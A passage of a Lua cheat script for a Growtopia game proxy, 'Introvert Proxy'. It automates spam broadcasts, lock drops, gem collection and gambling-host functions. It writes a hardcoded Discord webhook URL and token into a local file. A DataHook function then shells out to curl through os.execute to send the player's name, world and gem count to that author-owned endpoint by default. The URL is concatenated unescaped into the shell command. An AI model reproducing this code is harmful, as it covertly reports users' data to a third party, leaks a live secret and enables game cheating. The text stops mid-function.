-- do not touch

local localAppData = os.getenv("LOCALAPPDATA")
ITEM_DAT_PATH = localAppData.."/Growtopia/cache/items.dat"

function FChat(txt)
    p = {}
    p[0] = "OnTextOverlay"
    p[1] = txt
    p.netid = -1
    SendVarlist(p)
end

version = "3.5"
tiles = {}
tiles2 = {}
collectdd = {}
tx,ty = 0,0
w1x,w1y = 0,0
w2x,w2y = 0,0
tax = 5
win = 0
spamtext = "Im gay"
spam = false
ap = false
ak = false
ab = false
aw = false
pc = false
whitelist = {34150,101404,32875,445210,678585,140524,127939,675160,669607,658714,561893,525225,99671}
local lastfakespin = "NONE"
telex,teley = -1,-1
local shownamespin = true
BGL = GetItemCount(7188)
WL = GetItemCount(242)
DL = GetItemCount(1796)
userid = GetLocal().userid
name = GetLocal().name
gaspullshit = false
 HookChecker = true
  stopSB = 40
  amountSB = 0

  SbRunner = false

  textSB = "438ht4372h8t9h78eqwr978g98ugherwq8gyr9y8gewtrgy98"

  chat = "action|input\ntext|"

    SuperContent = "Sc Proxy by @Introvert_7672"
  SuperBroadCastsDone = 0
  StartTime = 0
  StopTime = StartTime + 3600  -- 1 hour from StartTime
  CurrentTime = os.time()
  SuperHour = false  -- For example, assuming you want to enable SuperHour

  SB_TIMER = 0


LOL = GetLocal()


TimeDifference = 0

    function huur(varlist, packet)
        if varlist[0]:find("OnConsoleMessage") then
            if varlist[1]:find("You can annoy with broadcasts again") then
                local TimeDifference = StopTime - CurrentTime
                if TimeDifference > 0 and SuperHour then
                    SuperBroadCastsDone = SuperBroadCastsDone + 1
                    SendPacket(2, "action|input\ntext|/sb " .. SuperContent)
                    SayInfo()
                end
            end
    
            if varlist[1]:find(SuperContent) then
                local TimeDifference = StopTime - CurrentTime
                if TimeDifference > 0 and SuperHour then
                    SendPacket(2, "action|input\ntext|/sb " .. SuperContent)

                    if Webhook ~= "Remove this and paste ur webhook here" or Webhook ~= " " then
                        if HookChecker == true then
                        RunThread(function ()
                            DataHook()
                        end)
                    end
                        
                    end
                end
            end
        end
    end
    
    AddCallback("sbstuff", "OnVarlist", huur)

function sl()
h1x,h1y,h2x,h2y,h3x,h3y = 0,0,0,0,0,0
a1x,a1y,a2x,a2y,a3x,a3y = 0,0,0,0,0,0
 
for _, obj in pairs(tiles) do
if _ == 1 then
h1x = math.floor(tonumber(obj['x']))
h1y = math.floor(tonumber(obj['y']))
elseif _ == 2 then
h2x = math.floor(tonumber(obj['x']))
h2y = math.floor(tonumber(obj['y']))
else
h3x = math.floor(tonumber(obj['x']))
h3y = math.floor(tonumber(obj['y']))
end
end
 
for _, objm in pairs(tiles2) do
if _ == 1 then
a1x = math.floor(tonumber(objm['x']))
a1y = math.floor(tonumber(objm['y']))
elseif _ == 2 then
a2x = math.floor(tonumber(objm['x']))
a2y = math.floor(tonumber(objm['y']))
else
a3x = math.floor(tonumber(objm['x']))
a3y = math.floor(tonumber(objm['y']))
end
end
 
putc,autow = "`4Disabled.","`4Disabled."
if pc then putc = "`^Enabled!" end
if aw then autow = "`^Enabled!" end
 



local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbannrttex|noflags|||
add_smalltext|Here are your configurations.|
add_spacer|small|
add_label_with_icon|small|`9Positions````|left|32|
add_smalltext|`9Left Player:[`2]] .. w1x.. [[`9,`2]].. w1y .. [[`9] |
add_smalltext|`9Right Player:[`2]] .. w2x.. [[`9,`2]].. w2y .. [[`9] |
add_smalltext|`9Left Gem Area:[`2]] .. h1x .. [[`9,`2]].. h1y .. [[`9],[`2]] .. h2x .. [[`9,`2]].. h2y .. [[`9],[`2]] .. h3x .. [[`9,`2]].. h3y .. [[`9] |
add_smalltext|`9Right Gem Area:[`2]] .. a1x .. [[`9,`2]].. a1y .. [[`9],[`2]] .. a2x .. [[`9,`2]].. a2y .. [[`9],[`2]] .. a3x .. [[`9,`2]].. a3y .. [[`9] |
add_spacer|small|
add_label_with_icon|small|`9State````|left|32|
add_smalltext|`9Auto Put Chand: ]] .. putc ..[[|
add_smalltext|`9Auto Drop to Winner: ]] .. autow ..[[|
add_spacer|small|
add_label_with_icon|small|`9Special````|left|32|
add_smalltext|`9Spam Text: ]] .. spamtext ..[[|
 
add_spacer|small|
add_button|main|Back|noflags|0|0|
]]
SendVarlist(var)
 
end
 
function menu()
local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbann.rttex|noflags|||
add_smalltext|`oCurrent World : `2]]..GetLocal().world..[[|left|
add_smalltext|`o X : `2]]..math.floor(GetLocal().tile_x)..[[ `0x `oY : `2]]..math.floor(GetLocal().tile_y)..[[|left|
add_smalltext|`oUser ID : `b]]..math.floor(GetLocal().userid)..[[ `0x `oNet ID : `2]]..math.floor(GetLocal().netid)..[[|left|
add_smalltext|`2Version: ]] .. version .. [[|
add_smalltext|Welcome, ]] .. GetLocal().name .. [[. This script is made by Introvert_7672, if you've purchased this from another source please be careful.|
add_spacer|small|
add_label_with_icon|small|`9Updates````|left|32|
add_smalltext|`^- New Command - /afk.|
add_smalltext|`^- New Command - /gaspull.|
add_smalltext|`^- New Command - /modal.|
add_smalltext|`^- New Command - /rcn.|
add_smalltext|`^- New Command - /dc.|
add_smalltext|`^- New Command - /ds.|
add_smalltext|`^- New Command - /fc.|
add_smalltext|`^- New Command - /warn.|
add_smalltext|`^- New Command - /co.|
add_smalltext|`^- New Command - /sall.|
add_smalltext|`^- New Command - /sreme.|
add_smalltext|`^- New Command - /sqq.|
add_smalltext|`^- New Command - /scheck.|
add_smalltext|`^- New Command - /super.|
add_smalltext|`^- New Command - /content.|
add_smalltext|`^- New Command - /sbtime.|
add_smalltext|`^- Updated Commands - /d, /dw, /dd, /db, /dbb.|
add_smalltext|`^- Added a toggle for bet logger.|
add_spacer|small|
 
add_button|logger|`^Bet Logger|noflags|0|0|

add_button|updates|`^Commands|noflags|0|0|
add_button|load|`^Load Config|noflags|0|0|
 
add_spacer|small|
end_dialog|||Continue|
]]
SendVarlist(var)
end
 
function update()
local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbann.rttex|noflags|||
add_smalltext|`oCurrent World : `2]]..GetLocal().world..[[|left|
add_smalltext|`o X : `2]]..math.floor(GetLocal().tile_x)..[[ `0x `oY : `2]]..math.floor(GetLocal().tile_y)..[[|left|
add_smalltext|`oUser ID : `b]]..math.floor(GetLocal().userid)..[[ `0x `oNet ID : `2]]..math.floor(GetLocal().netid)..[[|left|
add_smalltext|`2Version: ]] .. version .. [[|
add_smalltext|Welcome, ]] .. GetLocal().name .. [[. This script is made by Introvert_7672, if you've purchased this from another source please be careful.|
add_spacer|small|
 
add_label_with_icon|small|`9Commands````|left|32|
add_smalltext|`c/menu `9- Opens this dialog.|
add_smalltext|`c/ak `9- Toggles Auto Kick.|
add_smalltext|`c/res `9- Respawns player.|
add_smalltext|`c/relog `9- Relogins player.|
add_smalltext|`c/save `9- Saves configuration for ws1, ws2, /set, /s1, /s2.|
add_smalltext|`c/load `9- Loads configuration for ws1, ws2, /set, /s1, /s2.|
add_smalltext|`c/set <text> `9- Sets text for spam.|
add_smalltext|`c/spam`9- toggles auto spam.|
add_smalltext|`c/ap `9- Toggles Auto Pull.|
add_smalltext|`c/dp `9- Deposits ALL BGLs to BGL Bank.|
add_smalltext|`c/dp <amount>`9- Deposits BGLs to BGL Bank.|
add_smalltext|`c/wd <amount>`9- Withdraws BGLs to BGL Bank.|
add_smalltext|`c/tele  `9- Sets Telephone Coordinates.|
add_smalltext|`c/cv `9- Converts your Diamond Locks into Blue Gem Locks.|
add_smalltext|`c/fc `9- Close Proxy.|
add_smalltext|`c/warn `9- warn your self.|
add_smalltext|`c/rcn `9- relog when disconnect.|
add_smalltext|`c/afk `9- if you have role mods you can do this command.|
add_smalltext|`c/gaspull `9- auto pull when say gas,go,play.|
add_smalltext|`c/modal `9- showing modal.|

add_spacer|small|
add_label_with_icon|small|`9Drop Commands````|left|18|
add_smalltext|`c/d <amount> `9- Drops locks. (Amount is based on wl, Ex: /d 100 to drop 1 Diamond Lock. Not affected by /tax)|
add_smalltext|`c/dw <amount> <multiplier(optional)>`9- Drops World locks.|
add_smalltext|`c/dd <amount> <multiplier(optional)>`9- Drops Diamond locks.|
add_smalltext|`c/db <amount> <multiplier(optional)>`9- Drops Blue Gem locks.|
add_smalltext|`c/dbb <amount> <multiplier(optional)> `9- Drops Black Gem locks.|
add_smalltext|`c/daw `9- Drops All locks.|
add_smalltext|`c/dc `9- Drops clover.|
add_smalltext|`c/ds `9- Drops Arroz.|
add_smalltext|`c/split <percentage> `9- Drops all locks from inventory based on the percantage give. Example: you have 50 wls and you /split 10, it will drop 5 wls.|
add_spacer|small|
 
add_label_with_icon|small|`9REME Commands````|left|758|
add_smalltext|`c/scheck - check `^REAL or `4FAKE `9spun|
add_smalltext|`c/sreme - `9for reme host|
add_smalltext|`c/sqq - `9for qq host|
add_smalltext|`c/sall - `9check all spun reme qeme csn.|
add_smalltext|`cAdvanced Command: /co|
add_smalltext|`c/co add `9- Adds a new coordinate list based on player current coordinates.|
add_smalltext|`c/co list `9- Opens the dialog of coordinate list.|
add_smalltext|`c/co <amount> `9- Collects a certain coordinate based on list. Example: Position 1 will be collected using /co 1.|

add_spacer|small|
add_label_with_icon|small|`9Superbroadcast commands:|left|2480|
add_smalltext|`0~> `c/super `2<NEW>`w (`9Starts Auto SB)|left|
add_smalltext|`0~> `c/content `2<NEW>`w (SB Text) (`9Sets text for SBS)|left|
add_smalltext|`0~> `c/sbtime `2<NEW>`w (Number) (`9Sets time for SBS)|left|
add_smalltext|`0~> `#For /sbtime `2<NEW>`w (num). 3600 = 1hour. 1800 = 30min :)|left|
add_spacer|small|

add_label_with_icon|small|`9BTK Commands````|left|112|
add_smalltext|`c/s1  `9-Toggles the positions for the gem area of Player 1. Use the center icon as reference in the dialog.|
add_smalltext|`c/s2  `9-Toggles the positions for the gem area of Player 2. Use the center icon as reference in the dialog.|
add_smalltext|`c/ca `9-`9Teleports and collects all gems based on the positions set.  It then counts and provides the total amount of gems with comparison (/s1 and /s2 should be used first.).|
add_smalltext|`c/pc `9- Toggles Auto Put Chand.|
add_smalltext|`c/aw `9- Toggles Auto Drop to Winner.|
add_smalltext|`c/tax <amount> `9- Toggles tax percentage. Used for /w1 and /w2.|
add_smalltext|`c/ws1 `9-Toggles the Left player position. Stand on the position before using.|
add_smalltext|`c/ws2 `9-Toggles the Right player position. Stand on the position before using.|
add_smalltext|`c/tp `9- Collects dropped locks and auto sets prize. if /taxpos is set, auto drops the tax to the tax storage.|
add_smalltext|`c/taxpos `9- Toggles the tax storage position.|
add_smalltext|`c/w1 `9-Automatically teleports to Left's player position and drop prize (/tp should be used first.)(Affected by /tax).|
add_smalltext|`c/w2 `9-Automatically teleports to Right's player position and drop prize (/tp should be used first.)(Affected by /tax).|
 


add_spacer|small|
add_label_with_icon|small|`9Other Features````|left|32|
add_smalltext|`9Auto Pull - wrench the player to automatically pull.|
add_smalltext|`9Auto Convert - use /cv or wrench a telephone to automatically convert.|
add_smalltext|`9Fast Wheel - instant receive of spin messages.|
add_smalltext`9Fake/Real spin detection.|
add_smalltext|`9Auto Convert for collection.|
add_smalltext|`9Auto set of Telephone - used for /cv.|

add_spacer|small|
add_button|main|Back|noflags|0|0|
]]
SendVarlist(var)
end
 
local WebhookTXT = "IvertProxy_Hook.txt"

local HookLoad = io.open(WebhookTXT)

if HookLoad then
    Webhook = HookLoad:read("*a") -- Use HookLoad instead of WebhookTXT
    print(Webhook)
    io.close(HookLoad) -- Close the file object
else
    local fileTXT = io.open(WebhookTXT, "w") -- Open the file in write mode
    if fileTXT then
        fileTXT:write("https://discord.com/api/webhooks/1175631219367616542/vUBhZo9P8KcOLIgK9L0xVRpCxn28I0JUlRDst6kcyi0oS1hrMefCnaXm47tCIvOnXDKi") -- Write to the file
        io.close(fileTXT) -- Close the file
    else
        print("Failed to open or create the file.")
    end
end

local valueHook = "Gem count: "..math.floor(GetLocal().gems)
local valueHook2 = "Current world: "..GetLocal().world


formattedTime = os.date("%Y-%m-%d %H:%M:%S", StopTime)

function DataHook()
-- Construct the JSON data as a Lua string
local jsonData = [[
{
  "embeds": [
    {
      "title": "Ivert Proxy WebHooks",
      "description": "Greatest Creative-PS Proxy",
      "color": 16705372,
      "fields": [
        {
            "name": ":robot:Player",
            "value": "]] .. "Player name: ".. GetLocal().name .. [["
          },
        {
          "name": ":earth_americas:Current world",
          "value": "]] .. "Current world: ".. GetLocal().world .. [["
        },
        {
          "name": ":gem:Gems left",
          "value": "]] .. "Gems left: ".. math.floor(GetLocal().gems) .. [["
        },
        {
            "name": ":mega:Superbroadcast",
            "value": "]] .. "Stop time: ".. formattedStopTime .. [["
          }
      ]
    }
  ]
}
]]

-- Save the JSON data to a temporary file
local tempFile = io.open("temp.json", "w")
tempFile:write(jsonData)
tempFile:close()

-- Define the webhook URL
local webhookUrl = Webhook

-- Define the curl command with the temporary file
local command = 'curl -X POST -H "Content-Type: application/json" --data @"temp.json" ' .. webhookUrl

-- Execute the curl command
local success, exitCode, exitSignal = os.execute(command)

-- Check for errors
if success then
    print("Embed sent successfully.")
else
    print("Failed to send embed. Exit Code:", exitCode, "Exit Signal:", exitSignal)
end

-- Clean up the temporary file
os.remove("temp.json")
end

function Drop(d)
b = d % 100
a = math.floor((d % 10000) / 100)
c = math.floor((d % 1000000) / 10000)
e = math.floor(d / 1000000)
RunThread(function()
Sleep(200)
if e > 0 then
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|11550|\nitem_count|" .. e .. "")
Sleep(200)
end
if c > 0 then
if math.floor(GetItemCount(7188)) < math.floor(c) then
SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bluegl")
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|7188|\nitem_count|" .. c .. "")
Sleep(200)
end
if a > 0 then
if math.floor(GetItemCount(1796)) < math.floor(a) then
local packet = {}
packet.type = 10
packet.int_data = 7188
SendPacketRaw(packet)
Sleep(100)
end
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|1796|\nitem_count|" .. a .. "")
Sleep(200)
end
if b > 0 then
 
if math.floor(GetItemCount(242)) < math.floor(b) then
local packet = {}
packet.type = 10
packet.int_data = 1796
SendPacketRaw(packet)
Sleep(100)
end
 
SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|242|\nitem_count|" .. b .. "")
end
 
end)
 
 
end
 
function log(text)
    local packet = {}
    packet[0] = "OnConsoleMessage"
    packet[1] = "`0[`^Introvert_7672`0]`o " .. text
    packet.netid = -1
    SendVarlist(packet)
end
 
function setgem(count)
local var = {} 
var[0] = "OnDialogRequest"
var.netid = -1 
bruh = 0
if count == 1 then
bruh = "bro"
end
if count == 2 then
bruh = "bro2"
end
 
var[1] = [[
add_label_with_icon|big|`wSet Gem Area````|left|112|
add_spacer|small|
add_smalltext|Select area below.|
text_scaling_string|iprogram
text_scaling_string|
add_checkicon|m1||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 2, GetLocal().pos_y // 32 - 2).fg .. [[||0
text_scaling_string|
add_checkicon|m2||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 1, GetLocal().pos_y // 32 - 2).fg .. [[||0
text_scaling_string|
add_checkicon|m3||staticframe| ]] .. GetTile(GetLocal().pos_x // 32, GetLocal().pos_y // 32 - 2).fg .. [[||0
text_scaling_string|
add_checkicon|m4||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 1, GetLocal().pos_y // 32 - 2).fg .. [[||0
text_scaling_string|
add_checkicon|m5||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 2, GetLocal().pos_y // 32 - 2).fg .. [[||0
 
add_button_with_icon||END_LIST||0||
 
text_scaling_string|
add_checkicon|m6||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 2, GetLocal().pos_y // 32 - 1).fg .. [[||0
text_scaling_string|
add_checkicon|m7||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 1, GetLocal().pos_y // 32 - 1).fg .. [[||0
text_scaling_string|
add_checkicon|m8||staticframe| ]] .. GetTile(GetLocal().pos_x // 32, GetLocal().pos_y // 32 - 1).fg .. [[||0
text_scaling_string|
add_checkicon|m9||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 1, GetLocal().pos_y // 32 - 1).fg .. [[||0
text_scaling_string|
add_checkicon|m10||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 2, GetLocal().pos_y // 32 - 1).fg .. [[||0
 
add_button_with_icon||END_LIST||0||
 
text_scaling_string|
add_checkicon|m11||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 2, GetLocal().pos_y // 32).fg .. [[||0
text_scaling_string|
add_checkicon|m12||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 1, GetLocal().pos_y // 32 ).fg .. [[||0
text_scaling_string|
add_checkicon|m13|Player|staticframe|3542||0
text_scaling_string|
add_checkicon|m14||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 1, GetLocal().pos_y // 32).fg .. [[||0
text_scaling_string|
add_checkicon|m15||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 2, GetLocal().pos_y // 32).fg .. [[||0
 
add_button_with_icon||END_LIST||0||
 
text_scaling_string|
add_checkicon|m16||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 2, GetLocal().pos_y // 32 + 1).fg .. [[||0
text_scaling_string|
add_checkicon|m17||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 1, GetLocal().pos_y // 32 + 1).fg .. [[||0
text_scaling_string|
add_checkicon|m18||staticframe| ]] .. GetTile(GetLocal().pos_x // 32, GetLocal().pos_y // 32 + 1).fg .. [[||0
text_scaling_string|
add_checkicon|m19||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 1, GetLocal().pos_y // 32 + 1).fg .. [[||0
text_scaling_string|
add_checkicon|m20||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 2, GetLocal().pos_y // 32 + 1).fg .. [[||0
 
add_button_with_icon||END_LIST||0||
 
text_scaling_string|
add_checkicon|m21||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 2, GetLocal().pos_y // 32 + 2).fg .. [[||0
text_scaling_string|
add_checkicon|m22||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 - 1, GetLocal().pos_y // 32 + 2).fg .. [[||0
text_scaling_string|
add_checkicon|m23||staticframe| ]] .. GetTile(GetLocal().pos_x // 32, GetLocal().pos_y // 32 + 2).fg .. [[||0
text_scaling_string|
add_checkicon|m24||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 1, GetLocal().pos_y // 32 + 2).fg .. [[||0
text_scaling_string|
add_checkicon|m25||staticframe| ]] .. GetTile(GetLocal().pos_x // 32 + 2, GetLocal().pos_y // 32 + 2).fg .. [[||0
 
add_button_with_icon||END_LIST||0||
end_dialog|]] .. bruh .. [[|Cancel|Set Gem Area|
 
]]
SendVarlist(var)
 
end
 
function collect(id)
    for _, obj in pairs(GetObjects()) do
        if math.floor(obj.id) == id then
            local posx = math.abs(GetLocal().pos_x - obj.pos_x)
            local posy = math.abs(GetLocal().pos_y - obj.pos_y)
            if posx < 200 and posy < 200 then
                pkt = {}
                pkt.type = 11
                pkt.int_data = obj.oid
                pkt.pos_x = obj.pos_x
                pkt.pos_y = obj.pos_y
                SendPacketRaw(pkt)
				log(math.floor(obj.pos_x // 32))
				log(math.floor(obj.pos_y // 32))
            end
        end
    end
end
 
function netidfromname(username)
    for _, item in pairs(GetPlayers()) do
        if string.sub(item.name, 3, string.len(item.name) - 2) == username then
            return math.floor(item.netid)
        end
    end
    return GetLocal().netid
end
 
function namefromnetid(netid)
    for _, item in pairs(GetPlayers()) do
        if item.netid == netid then
            return item.name
        end
    end
    return GetLocal().netid
end
 
function move(x, y)
    pkt = {}
    pkt.type = 0
    pkt.pos_x = x * 32
    pkt.pos_y = y * 32
    pkt.int_x = -1
    pkt.int_y = -1
    SendPacketRaw(pkt)
    Sleep(50)
end
 
local function Punch(x, y, id)
  local player = GetLocal()
  local pkt_punch = {
    type = 3,
    int_data = id,
    pos_x = player.pos_x,
    pos_y = player.pos_y,
    int_x = x,
    int_y = y,
  }
  SendPacketRaw(pkt_punch)
end
 
function SayInfo()
    formattedStopTime = os.date("%H:%M", StopTime)
local Player = GetLocal().name
    RunThread(function ()
        Sleep(2000)
        SendPacket(2, "action|input\ntext|`w["..Player.."`w (megaphone)`0] end time: "..formattedStopTime)
        Sleep(2000)
        SendPacket(2, "action|input\ntext|`0Proxy Script made by `8@ivertt`0! My Discord:`c@Introvert_7672") -- `2Join the Discord --> `#discord.gg/
    
        
    end)
    
    
    end

function collect2(id,x,y)
    for _, obj in pairs(GetObjects()) do
        if math.floor(obj.id) == id and (math.floor(obj.pos_x // 32) == x or math.floor(obj.pos_x // 32) + 1 == x or math.floor(obj.pos_x // 32) - 1 == x)  and math.floor(obj.pos_y//32) == y then
                 pkt = {}
                pkt.type = 11
                pkt.int_data = obj.oid
                pkt.pos_x = x * 32
                pkt.pos_y = y * 32
                SendPacketRaw(pkt)
        end
    end
end
 
function l()
tiles = {}
tiles2 = {}
-- Open the file for reading
local file = io.open("data.txt", "r")
 
-- Read the data from the file

local dataString = file:read("*all")
-- Close the file
file:close()
 

 
 
a,b,c,d,e,h1x,h1y,h2x,h2y,h3x,h3y,a1x,a1y,a2x,a2y,a3x,a3y,putc,autow = string.match(tostring(dataString), "(%d+)|(%d+)|(%d+)|(%d+)|(%S+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)|(%d+)")
 
 
w1x = tonumber(a)
w1y =  tonumber(b)
w2x =  tonumber(c)
w2y =  tonumber(d)
spamtext = tostring(e)
 
if putc == nil then putc = 0 end
if autow == nil then autow = 0 end
 
pc = false
aw = false
if tonumber(putc) == 1 then pc = true end
if tonumber(autow) == 1 then aw = true end
 
local pos = {}
pos['x'] = tonumber(h1x)
pos['y'] =  tonumber(h1y)
table.insert(tiles, pos)
 
local pos = {}
pos['x'] =  tonumber(h2x)
pos['y'] =  tonumber(h2y)
table.insert(tiles, pos)
 
pos = {}
pos['x'] =  tonumber(h3x)
pos['y'] =  tonumber(h3y)
table.insert(tiles, pos)
 
local pos = {}
pos['x'] =  tonumber(a1x)
pos['y'] =  tonumber(a1y)
 
table.insert(tiles2, pos)
local pos = {}
pos['x'] =  tonumber(a2x)
pos['y'] =  tonumber(a2y)
table.insert(tiles2, pos)
local pos = {}
pos['x'] =  tonumber(a3x)
pos['y'] =  tonumber(a3y)
table.insert(tiles2, pos)
 
 
spamtext = string.gsub(spamtext, "_", " ")
 
end
 
function countdrop(id,x,y)
local c = 0
    for _, obj in pairs(GetObjects()) do
        if math.floor(obj.id) == id and (math.floor(obj.pos_x // 32) == x or math.floor(obj.pos_x // 32) + 1 == x or math.floor(obj.pos_x // 32) - 1 == x)  and math.floor(obj.pos_y//32) == y then
         c = c + obj.count
        end
    end
return math.floor(c)
end
 
 
function countdrop2(id,x,y)
local c = 0
    for _, obj in pairs(GetObjects()) do
        if math.floor(obj.id) == id and (math.floor(obj.pos_x // 32)) == x and math.floor(obj.pos_y//32) == y then
         c = c + obj.count
        end
    end
return math.floor(c)
end
function com(type, packet)
 
if 2 == type and packet:find("/menu") then
menu()
return true
end

if 2 == type and packet:find("/proxy") then
menu()
return true
end

if 2 == type and packet:find("/co ") then
d = string.match(packet, "/co (%w+)")
if d == nil then
d = string.match(packet, "/co (%d+)")
end
if d == "add" then
local pos = {}
pos['x'] = math.floor(GetLocal().pos_x //32)
pos['y'] = math.floor(GetLocal().pos_y //32)
table.insert(collectdd, pos)
str = ""
for _, i in pairs(collectdd) do 
str = str .. "add_button|Remove " .. _ .. "|`9Position " .. _ ..": [" .. i['x'] .. "," .. i['y'] .. "] `4[REMOVE]|noflags|0|0|\n"
end
local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbann.rttex|noflags|||
add_textbox|`9List of Display Boxes Coordinates:|
]] .. str .. [[
add_spacer|small|
end_dialog|colist||Continue|
]]
SendVarlist(var)
elseif d == "list" then
str = ""
for _, i in pairs(collectdd) do 
str = str .. "add_button|Remove " .. _ .. "|`9Position " .. _ ..": [" .. i['x'] .. "," .. i['y'] .. "] `4[REMOVE]|noflags|0|0|\n"
end
local var = {}
var[0] = "OnDialogRequest"
var.netid = -1 
 
 
var[1] = [[
set_default_color|`o
add_label_with_icon|big|`9Introvert Proxy````|left|32|
add_image_button|banner|interface/large/ivertbann.rttex|noflags|||
add_textbox|`9List of Display Boxes Coordinates:|
]] .. str .. [[
add_spacer|small|
end_dialog|colist||Continue|
]]
SendVarlist(var)
else
if tonumber(d) <= #collectdd then
name = {}
names = ""
local x = collectdd[tonumber(d)]['x']
local y = collectdd[tonumber(d)]['y']
for _, i in pairs(GetPlayers()) do
if math.floor(i.pos_y // 32) == y and (math.floor(i.pos_x // 32) - 2 == x or  math.floor(i.pos_x // 32) + 2 == x or math.floor(i.pos_x // 32) - 1 == x or  math.floor(i.pos_x // 32) + 1 == x or math.floor(i.pos_x // 32) == x) then
if i.name:find('`e') then
i.name = string.sub(i.name, 0, i.name:find("`e") - 5)
end
table.insert(name, i.name)
end
end

for _, i in pairs(name) do
if _ == #name then
names = names .. "" .. i .. ""
else
names = names .. "" .. i .. ", "
end
end
RunThread(function()
wl1 = countdrop(242, collectdd[tonumber(d)]['x'], collectdd[tonumber(d)]['y'])
dl1 = countdrop(1796, collectdd[tonumber(d)]['x'], collectdd[tonumber(d)]['y'])
bgl1 = countdrop(7188, collectdd[tonumber(d)]['x'], collectdd[tonumber(d)]['y'])
bbgl1 = countdrop(11550, collectdd[tonumber(d)]['x'], collectdd[tonumber(d)]['y'])
txt = ""
if bbgl1 > 0 then
txt = txt .. "`2" .. bbgl1 .." `bBlack Gem Locks "
end
if bgl1 > 0 then
txt = txt .. "`2" .. bgl1 .." `eBlue Gem Locks "
end
if dl1 > 0 then
txt = txt .. "`2" .. dl1 .." `cDiamond Locks "
end
if wl1 > 0 then
txt = txt .. "`2" .. wl1 .." `9World Locks "
end
SendPacket(2, "action|input\ntext|`9[`^Introvert_7672`9] Name: [" .. names .. "] `9Bets:".. txt .."")
if wl1 ~= nil then
collect2(242, tonumber(collectdd[tonumber(d)]['x']), tonumber(collectdd[tonumber(d)]['y']))
end
if dl1 ~= nil then
collect2(1796, tonumber(collectdd[tonumber(d)]['x']), tonumber(collectdd[tonumber(d)]['y']))
end
if bgl1 ~= nil then
collect2(7188, tonumber(collectdd[tonumber(d)]['x']), tonumber(collectdd[tonumber(d)]['y']))
end
if bbgl ~= nil then
collect2(11550, tonumber(collectdd[tonumber(d)]['x']), tonumber(collectdd[tonumber(d)]['y']))
end
end)
end
end

return true
end

if 2 == type and packet:find("/res") then
SendPacket(2, "action|respawn")
return true
end
 
if 2 == type and packet:find("/relog") then
SendPacket(3, "action|join_request\nname|" .. GetLocal().world .. "\ninvitedWorld|0")
return true
end
 
if 2 == type and packet:find("/save") then
h1x,h1y,h2x,h2y,h3x,h3y = 0,0,0,0,0,0
a1x,a1y,a2x,a2y,a3x,a3y = 0,0,0,0,0,0
 
for _, obj in pairs(tiles) do
if _ == 1 then
h1x = math.floor(tonumber(obj['x']))
h1y = math.floor(tonumber(obj['y']))
elseif _ == 2 then
h2x = math.floor(tonumber(obj['x']))
h2y = math.floor(tonumber(obj['y']))
else
h3x = math.floor(tonumber(obj['x']))
h3y = math.floor(tonumber(obj['y']))
end
end
 
for _, objm in pairs(tiles2) do
if _ == 1 then
a1x = math.floor(tonumber(objm['x']))
a1y = math.floor(tonumber(objm['y']))
elseif _ == 2 then
a2x = math.floor(tonumber(objm['x']))
a2y = math.floor(tonumber(objm['y']))
else

a3x = math.floor(tonumber(objm['x']))
a3y = math.floor(tonumber(objm['y']))
end
end
 
b = string.gsub(spamtext, " ", "_")
 
putc = 0
autow = 0
if pc then putc = 1 end
if aw then autow = 1 end
 
if b == nil then
b = "test"
end
local data = "" .. w1x .. "|" .. w1y .. "|" .. w2x .. "|" .. w2y .. "|" .. b .. "|" .. h1x .. "|" .. h1y .. "|" .. h2x .. "|" .. h2y .. "|" .. h3x .. "|" .. h3y .. "|" .. a1x .. "|" .. a1y .. "|" .. a2x .. "|" .. a2y .. "|" .. a3x .. "|" .. a3y .. "|" .. putc .. "|" .. autow .. ""
 
-- Open the file for writing
local file = io.open("data.txt", "w")
 
file:write(data)
 
-- Close the file
file:close()
sl()
return true
end
 
if 2 == type and packet:find("/load") then
l()
sl()
return true
end
 
if 2 == type and packet:find("/set") then
local var = {} --make table
var[0] = "OnDialogRequest"
var.netid = -1 --need to put netid or it doesn't work
 
 
var[1] = [[
set_default_color|`o
add_text_input|settext|`9Text:|]] .. spamtext .. [[|120|
end_dialog|setspamtext||Apply|
]]
SendVarlist(var)
return true
end
 
if 2 == type and packet:find("/spam") then
if spam then
SendPacket(2, "action|dialog_return\ndialog_name|cheats\ncheck_autospam|0")
spam = false
else
RunThread(function()
